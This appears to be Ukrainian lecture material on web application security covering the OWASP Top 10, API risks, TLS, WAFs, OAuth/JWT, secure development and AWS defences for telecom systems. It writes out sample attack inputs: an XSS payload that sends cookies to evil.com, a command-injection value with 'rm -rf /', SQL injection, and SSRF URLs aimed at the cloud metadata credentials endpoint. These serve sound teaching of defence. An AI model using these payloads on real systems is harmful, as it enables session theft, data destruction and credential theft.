## 1. Вступ до теми веб-безпеки у хмарному середовищі

Сучасний цифровий світ невіддільно пов'язаний із веб-застосунками. Від порталів самообслуговування мобільних операторів до RESTful-інтерфейсів між мережевими функціями 5G — всюди присутній HTTP-стек, що несе в собі як колосальні можливості для бізнесу, так і широку поверхню для атак. За даними компанії Verizon, звіт DBIR 2024 фіксує, що 43 % зафіксованих порушень безпеки даних так чи інакше пов'язані з веб-застосунками, а середня вартість одного інциденту, за оцінкою IBM, становить 4,45 мільйона доларів США.

Роль веб-застосунків у телекомунікаційній галузі важко переоцінити. Портали для управління передплатою, інтерфейси операційних та бізнес-підтримувальних систем (OSS/BSS), відкриті API для партнерів, інтерфейс NFV/SDN-панелей, платіжні шлюзи — усі ці системи функціонують поверх протоколу HTTP або HTTPS і безпосередньо взаємодіють із критичною інфраструктурою оператора. Навіть мережеві функції архітектури 5G Service-Based Architecture (SBA) спілкуються між собою через HTTP/2 з JSON-тілом повідомлень, фактично перетворюючи серцевину телекомунікаційної мережі на розподілений мікросервісний веб-застосунок.

Зв'язок між архітектурою застосунку та рівнем його безпеки є прямим і нерозривним. Рішення, прийняті на стадії проектування — модель даних, схема автентифікації, спосіб обробки вхідних параметрів — визначають увесь ландшафт вразливостей системи ще до написання першого рядка коду. Саме тому сучасна методологія безпечної розробки наголошує на концепції «зміщення вліво» (Shift-Left Security): чим раніше в циклі розробки виявляється вразливість, тим дешевше та швидше її можна усунути.

## 2. Ландшафт загроз для веб-застосунків

Розуміння ландшафту загроз є необхідною передумовою для побудови ефективного захисту. Статистика атак на веб-застосунки у 2024 році демонструє чітку структуру: ін'єкції різних видів (SQL, XSS та похідні) займають перше місце з часткою близько 32 % зафіксованих інцидентів, зловживання API — 21 %, порушення автентифікації та управління сесіями — 18 %, DDoS на прикладному рівні — 16 %, атаки на ланцюжок постачання через сторонні бібліотеки — 13 %.

Поверхня атаки типового веб-застосунку є надзвичайно широкою і включає вхідні дані користувача (форми, URL-параметри, HTTP-заголовки, cookie-файли), кінцеві точки API (REST, GraphQL, SOAP, WebSocket), зовнішні залежності (пакети npm, pip, Maven, сторонні JavaScript-файли), механізми автентифікації та відновлення паролю, функціонал завантаження файлів, конфігурацію сервера (заголовки відповіді, CORS-політики, повідомлення про помилки), а також саму серверну інфраструктуру — операційну систему, веб-сервер, базу даних.

У телекомунікаційному контексті ця поверхня суттєво розширюється. До стандартних компонентів додаються BSS/OSS-портали з прямим доступом до білінгових систем і баз даних абонентів, OAM-інтерфейси управління мережею, між-операторські API для роумінгу та взаємозв'язку, RESTful NF-інтерфейси SBA у мережах 5G, а також SIP-over-WebSocket-шлюзи для передачі голосу через веб.

## 3. OWASP Top 10 (2021) — систематизація основних вразливостей

Проєкт OWASP (Open Web Application Security Project) щорічно систематизує найпоширеніші та найнебезпечніші вразливості веб-застосунків. Редакція 2021 року виокремлює десять категорій, розташованих за рівнем ризику та частотою експлуатації.

**A01 — Broken Access Control** посів першу сходинку рейтингу, що відображає катастрофічне поширення помилок у реалізації логіки авторизації. Ця категорія об'єднує широкий спектр вразливостей — від можливості переглянути чужі дані через маніпуляцію ідентифікатором ресурсу до несанкціонованого підвищення привілеїв.

**A02 — Cryptographic Failures** (раніше відомий як «Sensitive Data Exposure») охоплює проблеми з неправильним або відсутнім шифруванням даних: передача чутливої інформації через незахищений канал, зберігання паролів у застарілих хеш-функціях, використання слабких алгоритмів.

**A03 — Injection** включає всі різновиди ін'єкційних атак: SQL-ін'єкції, командні ін'єкції в операційну систему, LDAP-ін'єкції, XSS (Cross-Site Scripting). Незважаючи на те, що методи захисту від ін'єкцій відомі вже понад двадцять років, ця категорія залишається критично актуальною через недостатнє дотримання безпечних практик кодування.

**A04 — Insecure Design** — відносно нова категорія, що підкреслює принципову різницю між помилками в реалізації та фундаментальними прогалинами в проектуванні. Відсутність rate limiting на формі входу або механізму блокування облікового запису після серії невдалих спроб — це не баг у коді, а дефект архітектурного рішення.

**A05 — Security Misconfiguration** відображає проблеми неправильної конфігурації: дефолтні паролі та облікові записи, надмірно відкриті хмарні сховища (S3 без обмежень доступу), непотрібні функції та сервіси, детальні повідомлення про помилки в продуктивному середовищі.

**A06 — Vulnerable and Outdated Components** набуває особливої гостроти в епоху активного використання сторонніх бібліотек. Інцидент Log4Shell (CVE-2021-44228) наочно продемонстрував, як критична вразливість в одному широко вживаному компоненті може одномоментно вразити мільйони систем по всьому світу.

**A07 — Identification and Authentication Failures** охоплює недоліки аутентифікації та управління сесіями: відсутність захисту від підбору паролів, слабкі або передбачувані сесійні токени, відсутність багатофакторної автентифікації (MFA), некоректна інвалідація сесії після виходу з системи.

**A08 — Software and Data Integrity Failures** стосується ненадійних механізмів оновлення програмного забезпечення, непідписаних пакетів і довіри до ненадійних CDN — усього, що може бути використано для атак на ланцюжок постачання (supply chain attacks).

**A09 — Security Logging and Monitoring Failures** підкреслює критичну роль видимості: якщо атака не виявляється своєчасно через відсутність логування або моніторингу, зловмисник може залишатися в системі в середньому 277 днів до виявлення (за даними IBM Cost of a Data Breach Report).

**A10 — Server-Side Request Forgery (SSRF)** вперше потрапив до топ-10 у редакції 2021 року, що відображає зростаючу поширеність хмарних середовищ, де цей клас вразливостей має особливо серйозні наслідки через доступ до сервісів метаданих хмарного провайдера.

## 4. A01: Broken Access Control та IDOR — детальний аналіз

Broken Access Control є найпоширенішою вразливістю сучасних веб-застосунків. Її суть полягає в тому, що застосунок не належним чином перевіряє, чи має конкретний автентифікований користувач право виконувати ту чи іншу дію або отримувати доступ до того чи іншого ресурсу.

Особливо важливим підвидом цієї категорії є **Insecure Direct Object Reference (IDOR)** — вразливість, за якої ідентифікатор ресурсу (числовий ID, ім'я файлу, UUID) передається безпосередньо клієнтом, а сервер не перевіряє, чи є запитувач законним власником цього ресурсу. Розглянемо типовий приклад:

```
GET /api/invoices/1042   ← рахунок поточного користувача
GET /api/invoices/1041   ← рахунок іншого користувача (IDOR!)
```

Якщо сервер повертає дані за запитом `/api/invoices/1041` без перевірки того, що користувач, який здійснює запит, є власником рахунку 1041, це класична IDOR-вразливість. У телекомунікаційному контексті такий недолік може призвести до витоку деталізованих записів дзвінків (CDR) — персональних даних, що охороняються законодавством про захист персональних даних.

Ефективний захист від Broken Access Control базується на кількох ключових принципах. По-перше, перевірка прав доступу повинна здійснюватися на кожному запиті до backend, незалежно від того, чи виконується перевірка на клієнтській стороні. По-друге, слід дотримуватися принципу «заборонено за замовчуванням» (deny by default): усе, що явно не дозволено, забороняється. По-третє, доцільно використовувати непередбачувані ідентифікатори (UUID замість послідовних цілих чисел), хоча самі по собі вони не є засобом захисту. По-четверте, необхідно застосовувати централізовану логіку авторизації та автоматизовані тести, що верифікують правила доступу.

У хмарному середовищі AWS ефективний RBAC забезпечується комбінацією сервісів IAM (для ролей та політик доступу до ресурсів AWS) та Amazon Cognito (для управління ролями та групами кінцевих користувачів застосунку).

## 5. A03: Ін'єкції — SQL, Command, LDAP

Ін'єкційні атаки є одним з найстаріших і водночас найактуальніших класів вразливостей у веб-безпеці. Принцип їх дії єдиний: зловмисник вбудовує шкідливі дані у запит таким чином, що інтерпретатор (сервер бази даних, командна оболонка, LDAP-сервер) виконує ці дані як команду, а не обробляє їх як безпечний рядок.

**SQL Injection** залишається найпоширенішим різновидом. Розглянемо вразливий Python-код:

```python
# ВРАЗЛИВО — конкатенація рядків
query = "SELECT * FROM users WHERE login='" + username + "'"
```

Якщо зловмисник передасть значення `admin'--` як ім'я користувача, запит перетвориться на:

```sql
SELECT * FROM users WHERE login='admin'--'
```

Подвійне тире (`--`) є коментарем у SQL, тому решта запиту ігнорується, і виконується пошук лише за логіном `admin` без перевірки паролю. Захист є простим і абсолютно ефективним — параметризовані запити:

```python
# БЕЗПЕЧНО — параметризований запит
cursor.execute("SELECT * FROM users WHERE login=?", (username,))
```

При параметризованому підході значення передається як окремий параметр, а не вбудовується в рядок SQL-запиту. СУБД обробляє значення виключно як дані, незалежно від їх вмісту.

**Command Injection** виникає, коли застосунок передає введені користувачем дані до функцій виконання системних команд без належної санітизації:

```python
# ВРАЗЛИВО
os.system("ping " + user_input)
# Атака: user_input = "8.8.8.8; rm -rf /"
```

Захист полягає у використанні безпечних API, які передають аргументи як окремий список, унеможливлюючи інтерпретацію метасимволів командного рядка:

```python
# БЕЗПЕЧНО
subprocess.run(["ping", "-c", "1", ip], check=True)
```

**LDAP Injection** є менш відомим, але не менш небезпечним різновидом, що виникає в системах, які використовують Active Directory або інші LDAP-каталоги для аутентифікації. Захист аналогічний — застосування LDAP-екранування для спеціальних символів.

Загальний принцип захисту від усіх типів ін'єкцій полягає у чіткому розмежуванні між кодом та даними: дані ніколи не повинні інтерпретуватися як команди. Інструменти — параметризовані запити, ORM-фреймворки (SQLAlchemy, Hibernate), валідація вхідних даних за дозволеним списком (whitelist), мінімальні права облікового запису бази даних, а також WAF як додатковий шар захисту.

## 6. A02: Cryptographic Failures — помилки криптографічного захисту

Криптографічні збої є другою за значущістю категорією вразливостей. Вони виникають не лише тоді, коли шифрування взагалі відсутнє, але й тоді, коли використовуються застарілі або неправильно налаштовані криптографічні алгоритми.

Серед найпоширеніших помилок виокремлюють такі: передача чутливих даних (паролів, номерів карток, персональних даних) через незашифрований протокол HTTP замість HTTPS; зберігання паролів у вигляді хешів MD5 або SHA-1 без солі (salt); використання слабких або статичних векторів ініціалізації (IV/nonce) для симетричного шифрування; хардкодування криптографічних ключів безпосередньо у вихідному коді; відключення перевірки SSL-сертифікатів (`verify=False` в Python-бібліотеці `requests`); застосування застарілих алгоритмів DES, RC4 або режиму ECB для AES.

Показовим прикладом є інцидент із LinkedIn у 2012 році: база даних із 6,5 мільйонами хешів паролів, обчислених алгоритмом MD5 без солі, була викрадена і в повному обсязі зламана протягом кількох годин за допомогою звичайних райдужних таблиць (rainbow tables). Цей випадок наочно демонструє, що неправильний вибір криптографічного алгоритму є рівнозначним повній відсутності захисту.

Сучасні рекомендації щодо зберігання паролів вимагають застосування спеціалізованих повільних алгоритмів хешування — bcrypt, Argon2id або scrypt. Вони спеціально спроектовані для того, щоб підбір паролю перебором вимагав значних обчислювальних ресурсів:

```python
# ✅ Правильне хешування паролів (Python)
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# або Argon2id
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
```

Для шифрування даних рекомендовано AES-256-GCM або ChaCha20-Poly1305 — алгоритми аутентифікованого шифрування (AEAD), які одночасно забезпечують конфіденційність та цілісність даних. Для транспортного шифрування необхідно вимагати TLS 1.2 або 1.3, повністю відключивши підтримку застарілих версій.

## 7. A07: XSS — міжсайтовий скриптинг

Cross-Site Scripting (XSS) є атакою, за якої зловмисник впроваджує шкідливий JavaScript-код у веб-сторінку таким чином, що він виконується в браузері жертви. Наслідки можуть бути різноманітними: викрадення сесійних cookies, перенаправлення на фішинговий сайт, виконання несанкціонованих дій від імені жертви, кейлогінг та збір введених даних.

Розрізняють три основних типи XSS. **Reflected XSS** виникає, коли шкідливий скрипт включений безпосередньо у HTTP-запит і негайно відображається у відповіді сервера без збереження. Типовий вектор — параметри пошукового запиту:

```
https://site.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
```

**Stored XSS** є більш небезпечним різновидом: шкідливий скрипт зберігається в базі даних і виконується при кожному завантаженні сторінки будь-яким відвідувачем. Форуми, системи коментарів, поля профілю користувача — типові вектори для збереженого XSS.

**DOM-based XSS** маніпулює об'єктною моделлю документа (DOM) на стороні клієнта, без взаємодії з сервером. Вразливий код виглядає так:

```javascript
// ВРАЗЛИВО
document.getElementById('output').innerHTML = location.hash;
```

Якщо зловмисник переконає жертву перейти за посиланням із шкідливим фрагментом URL (#), код виконається у браузері жертви.

Ефективний захист від XSS базується на кількох взаємодоповнюючих заходах. **Output encoding** — правильне HTML-кодування всіх даних, що виводяться у HTML-контекст — є першою лінією захисту. Сучасні фреймворки (React, Vue, Angular) виконують автоматичне екранування за замовчуванням. **Content Security Policy (CSP)** дозволяє задекларувати список дозволених джерел скриптів, стилів і медіа-ресурсів:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'
```

Флаг **HTTPOnly** для сесійних cookie забороняє JavaScript-коду читати їх значення, нівелюючи найпоширеніший наслідок XSS-атак. Уникання небезпечних DOM-методів (`innerHTML`, `document.write`, `eval()`) та використання бібліотеки DOMPurify для sanitization HTML-вмісту — необхідні практики безпечного фронтенд-розробки.

## 8. CSRF — міжсайтова підробка запитів

Cross-Site Request Forgery (CSRF) — атака, що змушує автентифікованого користувача ненавмисно виконати небажану дію на довіреному сайті. Механізм атаки базується на тому, що браузер автоматично додає cookie автентифікації до кожного запиту, незалежно від того, з якого сайту цей запит ініційований.

Класичний сценарій CSRF: жертва автентифікована на `bank.com` і одночасно переглядає шкідливий сайт `evil.com`, на якому розміщено приховану HTML-форму або зображення з атрибутом `src`:

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

Браузер автоматично надішле GET-запит до банку, включаючи сесійний cookie, і якщо сервер не захищений від CSRF, переказ буде виконано.

Найефективніший захід — **CSRF-токен**: унікальне непередбачуване значення, що генерується сервером, вставляється у кожну HTML-форму і перевіряється при обробці POST-запиту. Зловмисний сайт не може прочитати цей токен через Same-Origin Policy браузера.

Атрибут **SameSite** для cookie є сучасним і ефективним механізмом захисту. Значення `Strict` повністю забороняє надсилання cookie у крос-сайтових запитах, `Lax` дозволяє лише безпечні навігаційні GET-запити:

```
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
```

Популярні фреймворки (Django, Rails, Laravel) мають вбудований захист від CSRF, який активується автоматично. Django, наприклад, вимагає наявності `{% csrf_token %}` у кожній формі та перевіряє його в middleware `CsrfViewMiddleware`.

## 9. A10: SSRF — підробка запитів на стороні сервера

Server-Side Request Forgery (SSRF) є атакою, за якої зловмисник змушує веб-сервер виконати HTTP-запит до довільного ресурсу — внутрішнього або зовнішнього. Особливу небезпеку SSRF становить у хмарних середовищах, де через цю вразливість можна отримати доступ до сервісів метаданих хмарного провайдера.

Розглянемо типовий вразливий endpoint:

```
GET /fetch?url=https://example.com
```

Зловмисник може змінити параметр `url` для атаки на різні цілі:

```
# Отримання IAM-credentials через AWS IMDS v1:
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role

# Доступ до внутрішніх сервісів:
url=http://internal-admin.corp:8080/admin

# Сканування внутрішньої мережі:
url=http://10.0.0.1/
```

Класичним прикладом реального інциденту є зламування Capital One у 2019 році: зловмисник використав SSRF-вразливість у WAF-застосунку для отримання тимчасових AWS IAM-credentials через IMDSv1 (Instance Metadata Service версії 1), що не вимагав попередньої аутентифікації. Це дозволило отримати несанкціонований доступ до S3-сховищ із персональними даними понад 100 мільйонів клієнтів банку.

Заходи захисту від SSRF включають: валідацію та фільтрацію URL за дозволеним списком доменів та IP-адрес; блокування запитів до приватних діапазонів IP (10.x.x.x, 172.16-31.x.x, 192.168.x.x, 169.254.x.x); обов'язкове використання IMDSv2 на EC2-інстансах AWS (токен-сесійна аутентифікація унеможливлює несанкціонований доступ через SSRF); відключення непотрібних URL-схем (`file://`, `gopher://`); мережеву ізоляцію backend-серверів через egress-фільтрацію. AWS WAF надає вбудовані правила для виявлення та блокування SSRF-патернів.

## 10. Аутентифікація та управління сесіями

Надійна аутентифікація є фундаментом безпеки будь-якого веб-застосунку. Категорія A07 OWASP охоплює широкий спектр вразливостей, пов'язаних з ідентифікацією користувачів та управлінням їхніми сесіями.

Серед найпоширеніших вразливостей аутентифікації виокремлюють: відсутність захисту від підбору паролю (brute force) через необмежену кількість спроб входу; використання слабких або дефолтних паролів; зберігання ідентифікатора сесії в URL-параметрі, де він може витікати через заголовок Referer або бути залогований; відсутність інвалідації сесії на стороні сервера після виходу з системи; надмірно тривалий термін дії сесії або JWT-токену; відсутність MFA для критичних операцій; небезпечний механізм відновлення паролю (контрольні питання).

Особливої уваги заслуговує атака **Credential Stuffing** — автоматизоване тестування списків витоків паролів з інших сервісів. Оскільки більшість користувачів використовують однакові паролі для різних сайтів, зловмисники систематично перевіряють бази витоків проти цільових систем за допомогою спеціалізованих інструментів.

Кращі практики аутентифікації формують комплексний захист. Паролі необхідно хешувати з використанням bcrypt або Argon2id з мінімальною довжиною 12 символів та перевірки за базою відомих витоків (Have I Been Pwned API). Після 5 невдалих спроб входу слід застосовувати прогресивну затримку або блокування з CAPTCHA. Багатофакторна аутентифікація (TOTP через Google Authenticator або WebAuthn/FIDO2) є обов'язковою для привілейованих операцій. Сесійний ідентифікатор повинен бути 128-бітним криптографічно стійким випадковим значенням, переданим виключно через cookie з атрибутами `HttpOnly`, `Secure` та `SameSite`. Термін idle-сесії рекомендовано обмежувати 15–30 хвилинами, абсолютний термін — 8 годинами. AWS Cognito надає готовий сервіс ідентифікації з підтримкою MFA, TOTP, FIDO2, OAuth 2.0 та JWT.

## 11. OWASP API Security Top 10 — вразливості інтерфейсів програмування

API-безпека виокремлена в окремий напрямок у зв'язку зі специфічним характером ризиків, притаманних програмним інтерфейсам. OWASP API Security Top 10 описує найбільш поширені вразливості API-архітектур.

**API1 — Broken Object Level Authorization (BOLA)** є API-аналогом IDOR і є найпоширенішою API-вразливістю: endpoint дозволяє маніпулювати ідентифікаторами об'єктів без перевірки права доступу до конкретного об'єкта. **API2 — Broken Authentication** охоплює проблеми з API-ключами без терміну дії, слабкими токенами або відсутністю ротації секретів. **API3 — Broken Object Property Level Authorization** стосується ситуацій, коли через PATCH-запит повертаються або можуть бути змінені поля, недоступні для поточного користувача.

**API4 — Unrestricted Resource Consumption** описує відсутність ліміту на споживання ресурсів — кількість запитів, розмір відповіді, глибину рекурсії в GraphQL. Без rate limiting будь-який API-endpoint є потенційним вектором DoS-атаки. **API7 — SSRF через API** нагадує, що параметри типу `url` у POST-тілі запиту є настільки ж небезпечними, що й в URL-рядку. **API9 — Improper Inventory Management** наголошує на ризиках застарілих версій API: якщо `/v1/` без обмежень доступу продовжує функціонувати поряд із захищеним `/v3/`, зловмисник просто використовуватиме стару незахищену версію.

Ключові принципи захисту API: автентифікація та авторизація на кожному endpoint — не лише на рівні маршрутизатора; rate limiting за IP, за користувачем, за endpoint; версіонування з офіційним виводом з експлуатації застарілих версій; валідація схеми запиту за специфікацією OpenAPI/JSON Schema; мінімальна відповідь — не повертати зайвих полів; централізований API Gateway як єдина точка входу.

У телекомунікаційному контексті ці ризики набувають критичного характеру: зловживання API NEF чи CAMARA може призвести до несанкціонованого стеження за місцезнаходженням абонентів, обходу SIM-своп-захисту або витоку даних роумінгу.

## 12. HTTPS та TLS — забезпечення транспортної безпеки

HTTPS (HTTP Secure) є стандартом де-факто для всіх сучасних веб-застосунків. В основі HTTPS лежить протокол TLS (Transport Layer Security), що забезпечує шифрування, аутентифікацію та цілісність даних у транспортному каналі.

Процес встановлення TLS 1.3-з'єднання (TLS Handshake) відбувається в кілька кроків. Клієнт надсилає повідомлення **ClientHello** із підтримуваними версіями протоколу, cipher suites та криптографічним матеріалом. Сервер відповідає **ServerHello** разом із сертифікатом та ключовим матеріалом для алгоритму Диффі-Геллмана на еліптичних кривих (ECDHE). Клієнт перевіряє ланцюжок сертифікатів до довіреного кореневого CA, після чого генерується спільний секрет та встановлюється зашифрований канал — увесь процес відбувається за один раунд (1-RTT), що суттєво скорочує затримку порівняно з TLS 1.2.

Безпечна конфігурація Nginx для TLS виглядає наступним чином:

```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_session_cache shared:SSL:10m;
ssl_stapling on;
```

Серед типових проблем конфігурації TLS: підтримка застарілих версій TLS 1.0/1.1, вразливих до атак BEAST та POODLE; використання слабких cipher suites (RC4, 3DES); самопідписані сертифікати, що унеможливлюють надійну верифікацію сервера; протерміновані сертифікати; mixed content (завантаження HTTP-ресурсів у HTTPS-сторінці); відсутність HSTS (HTTP Strict Transport Security), що уможливлює SSL-stripping атаки.

AWS Certificate Manager (ACM) надає безкоштовні публічні SSL/TLS-сертифікати з автоматичним оновленням, що безпосередньо інтегруються з ALB, CloudFront та API Gateway.

## 13. WAF, Security Headers та CSP

Web Application Firewall (WAF) аналізує HTTP/HTTPS-трафік та блокує шкідливі запити ще до того, як вони досягнуть застосунку. Залежно від способу розгортання WAF поділяється на три типи: мережевий (апаратне рішення перед DMZ), хостовий (модуль у веб-сервері, наприклад ModSecurity) та хмарний (SaaS-рішення, наприклад AWS WAF, Cloudflare, Imperva).

WAF захищає від стандартних атак OWASP Top 10 (SQL Injection, XSS, Command Injection), бот-трафіку та скрейпінгу, brute force через rate limiting, а також дозволяє реалізувати geo-blocking та блокування за IP-репутацією. Однак важливо розуміти обмеження WAF: він не замінює безпечний код; бізнес-логічні вразливості (IDOR, порушення авторизації) WAF не може виявити, оскільки не знає контексту додатку; false positive — блокування легітимних запитів — є практичною проблемою; WAF можна обійти через різні техніки кодування (URL-encoding, unicode-bypass).

HTTP Security Headers є одним із найпростіших і найефективніших механізмів захисту веб-застосунків. Ключові заголовки включають:

- `Strict-Transport-Security: max-age=31536000; includeSubDomains` — примусове використання HTTPS (HSTS)
- `Content-Security-Policy` — декларування дозволених джерел ресурсів, захист від XSS
- `X-Frame-Options: DENY` — захист від Clickjacking
- `X-Content-Type-Options: nosniff` — заборона MIME-sniffing
- `Referrer-Policy: strict-origin-when-cross-origin` — контроль витоку URL через заголовок Referer
- `Permissions-Policy` — обмеження доступу JavaScript до API браузера (камера, мікрофон, геолокація)

Content Security Policy (CSP) заслуговує особливої уваги як потужний механізм контролю завантаження ресурсів. Директива `script-src 'self' 'nonce-{random}'` дозволяє виконання скриптів лише з того ж домену та скриптів з коректним nonce-атрибутом, ефективно блокуючи більшість XSS-атак навіть у разі вразливого коду.

## 14. OAuth 2.0, JWT та OpenID Connect

OAuth 2.0, JWT та OpenID Connect формують сучасний стек стандартів делегованої авторизації та аутентифікації. Їх правильне розуміння та реалізація є критично важливими для безпеки як веб-застосунків, так і API.

**OAuth 2.0** — це фреймворк авторизації, що визначає протоколи для безпечного делегування доступу до ресурсів. Серед чотирьох оригінальних flows поточними рекомендаціями для різних сценаріїв є: **Authorization Code + PKCE** — для веб та мобільних застосунків (PKCE захищає від перехоплення authorization code); **Client Credentials** — для автентифікації машина-до-машини (M2M), зокрема між мікросервісами та в NF-to-NF взаємодіях в архітектурі 5G SBA. Implicit flow та Resource Owner Password flow визнані застарілими та небезпечними й не повинні використовуватись у нових системах.

**JSON Web Token (JWT)** є компактним, самодостатнім форматом токена, що складається з трьох частин, закодованих Base64url та розділених крапками: заголовок (header), корисне навантаження (payload) і підпис (signature). Типовий payload містить ідентифікатор користувача (`sub`), видавця токена (`iss`), призначену аудиторію (`aud`), час закінчення дії (`exp`) та ролі. Серед типових вразливостей JWT: атака `alg: none` — встановлення значення `none` для алгоритму підпису, що дозволяє підробити токен без знання секрету; атака `RS256→HS256` — підміна асиметричного алгоритму симетричним, що дозволяє підписати токен публічним ключем як HS256-секретом; відсутність `exp` — токен діє необмежено довго.

**OpenID Connect (OIDC)** є надбудовою над OAuth 2.0, що додає шар аутентифікації: підтверджує особу користувача через `id_token` та стандартний `userinfo`-endpoint. OIDC відповідає на питання «хто ти?», тоді як OAuth 2.0 — на питання «що тобі дозволено робити?».

## 15. Secure SDLC, DevSecOps та інструменти тестування безпеки

Secure Software Development Life Cycle (Secure SDLC) інтегрує заходи безпеки в кожну фазу циклу розробки програмного забезпечення. Концепція **Shift-Left Security** передбачає якомога раніше залучення практик безпеки в процес розробки, починаючи з фази формулювання вимог.

Економічне обґрунтування Shift-Left є переконливим: вартість виправлення вразливості, виявленої на стадії вимог, складає умовно $1, на стадії проектування — $5, під час розробки — $15, у фазі QA — $30, а в продуктивному середовищі — понад $150. Ця прогресія відображає зростаючу складність змін, ризики для репутації та вартість реагування на інцидент.

Модель загроз (**Threat Modeling**) є ключовою практикою безпечного проектування. Методологія STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) дозволяє систематично виявляти потенційні загрози для компонентів системи на стадії архітектурного проектування, коли їх усунення є найменш витратним.

**OWASP Application Security Verification Standard (ASVS)** надає детальний чеклист вимог безпеки, організований за трьома рівнями: Рівень 1 — базова безпека для всіх застосунків; Рівень 2 — стандартний рівень для більшості застосунків (286 вимог); Рівень 3 — критичні системи (банківський сектор, телеком, медицина).

**SAST (Static Application Security Testing)** аналізує вихідний код без його виконання. Провідні інструменти: **Semgrep** (відкритий, підтримує 20+ мов, дозволяє написання кастомних правил), **SonarQube** (широка інтеграція з CI/CD, метрики технічного боргу), **Bandit** (AST-аналіз Python-коду), **CodeQL** (GitHub Advanced Security, моделювання потоків даних).

**DAST (Dynamic Application Security Testing)** тестує запущений застосунок, імітуючи реальні атаки. **OWASP ZAP** — відкритий стандарт для автоматизованого scanning у CI/CD та ручного тестування API. **Burp Suite** є золотим стандартом ручного пентестингу завдяки широким можливостям перехоплення та модифікації HTTP-трафіку.

**SCA (Software Composition Analysis)** автоматично виявляє вразливості у використовуваних залежностях: **Snyk** і **GitHub Dependabot** відстежують CVE у npm, pip, Maven, Go-модулях та автоматично надсилають pull request з оновленнями.

## 16. Моніторинг, виявлення атак та DDoS-захист

Ефективний моніторинг безпеки є необхідною умовою своєчасного виявлення та реагування на інциденти. OWASP A09 наголошує: відсутність належного логування та моніторингу дозволяє зловмисникам залишатися в системі в середньому 277 днів до виявлення.

Обов'язковому логуванню підлягають: всі спроби автентифікації (успішні та невдалі) з IP-адресами; зміни прав доступу та облікових записів; HTTP-помилки 4xx/5xx в аномальній кількості; звернення до чутливих endpoints; спрацьовування WAF та заблоковані запити; SQL-помилки та stack traces у відповідях; аномальний обсяг запитів від одного IP. AWS забезпечує комплексну інфраструктуру моніторингу: WAF Logs через Kinesis Data Firehose → S3 → Athena; CloudWatch для метрик та аномалій; GuardDuty для ML-детекції загроз; Security Hub для агрегації findings; CloudTrail для аудиту всіх AWS API-дій.

**DDoS (Distributed Denial of Service)** атаки на веб-рівні класифікуються за моделлю OSI. Об'ємні атаки (volumetric) L3/L4 — UDP flood, ICMP flood, DNS amplification — спрямовані на вичерпання пропускної здатності каналу. Протокольні атаки L4 — SYN flood — вичерпують стан з'єднань на балансувальниках та серверах. Прикладні атаки L7 — HTTP flood, Slowloris, POST flood — найскладніші для виявлення та фільтрації, оскільки використовують легітимні HTTP-запити.

Ешелонована оборона від DDoS в AWS будується за принципом Defense in Depth. На першому рівні — Route 53 з Anycast-маршрутизацією та захистом від query flooding. На другому — CloudFront поглинає атакуючий трафік на edge-вузлах по всьому світу (450+ PoP), запобігаючи досягненню origin. На третьому рівні — AWS Shield Advanced забезпечує автоматичну детекцію та мітигацію L3/L4/L7-атак. Четвертий рівень — AWS WAF з rate limiting та IP reputation rules. П'ятий рівень — ALB з timeout-конфігурацією та connection limits. Нарешті, на рівні застосунку — CAPTCHA, queue-based processing та circuit breaker pattern.

## 17. Кращі практики та архітектура захищеного веб-застосунку в AWS

Побудова захищеного веб-застосунку вимагає системного підходу, що охоплює рівень коду, інфраструктури та процесів розробки.

На **рівні застосунку** необхідно: валідувати всі вхідні дані на стороні сервера за принципом whitelist (дозволено тільки те, що очікується); використовувати параметризовані запити для всіх взаємодій із базою даних; застосовувати output encoding залежно від контексту (HTML, JavaScript, URL); надавати мінімальні привілеї для облікових записів бази даних та сервісних ролей; безпечно управляти секретами через AWS Secrets Manager або HashiCorp Vault; регулярно сканувати залежності на вразливості; встановлювати security headers на всіх відповідях.

На **рівні інфраструктури**: HTTPS скрізь з HSTS preloading; WAF перед кожним публічним endpoint; мережева сегментація через DMZ та приватні підмережі; регулярне penetration testing (щоквартально); patch management із часовими вікнами (критичні — ≤ 24 год, важливі — ≤ 7 днів).

Еталонна архітектура захищеного веб-застосунку в AWS реалізує класичний принцип **Defence in Depth** через вертикальну стеку захисних рівнів: Route 53 (GeoDNS + Shield Advanced) → CloudFront (TLS 1.3, WAF, OAC) → AWS WAF (Managed Rules + Custom Rules) → ALB (ACM-сертифікат) → Cognito (MFA + JWT) → ECS/EKS (non-root container, read-only filesystem) → RDS (шифрування at rest + at transit, VPC Private Subnet) → AWS Secrets Manager (ротація credentials) → GuardDuty + Security Hub + CloudTrail (моніторинг і аудит).

Ключові архітектурні принципи: **Zero Trust** — перевіряй завжди, не довіряй нікому, навіть всередині периметру; **Least Privilege** — мінімальні права для кожного компонента; **Fail Secure** — при помилці система повинна відмовляти в доступі, а не дозволяти його; **Separation of Concerns** — чіткий розподіл відповідальності між компонентами.

## 18. Телеком веб-застосунки — унікальна поверхня атаки

Телекомунікаційна галузь накладає особливі вимоги та ризики на безпеку веб-застосунків, що суттєво відрізняють її від типового корпоративного середовища.

Перш за все, вимоги до **доступності** є надзвичайно жорсткими: стандарт «п'ять дев'яток» (99,999%) допускає не більше 5 хвилин простою на рік. Будь-яке оновлення безпеки, що потребує перезапуску сервісу, повинно виконуватись у режимі rolling deployment без втрати доступності. По-друге, телеком-системи працюють у режимі **реального часу**: VoIP, відеопотоки та сигналізація вимагають затримки менше 150 мс, що обмежує можливості застосування деяких засобів захисту (глибока інспекція пакетів може додавати неприйнятну затримку). По-третє, **масштаб** телеком-систем є колосальним: мільйони одночасних сесій, мільярди CDR-записів.

